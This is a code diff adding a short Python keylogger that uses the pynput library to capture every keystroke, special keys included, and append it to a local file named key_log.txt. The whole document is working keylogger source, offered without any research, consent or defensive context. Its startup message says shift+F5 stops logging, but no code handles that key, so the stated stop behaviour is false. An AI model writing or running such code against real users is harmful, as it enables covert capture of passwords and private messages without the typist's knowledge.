@@ -1,0 +1,19 @@
+from pynput import keyboard
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        # Special keys like space, enter, etc.
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+def main():
+    print("🔒 Keylogger started. Press shift+F5 to stop.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()  # Run the listener in blocking mode
+
+if __name__ == "__main__":
+    main()
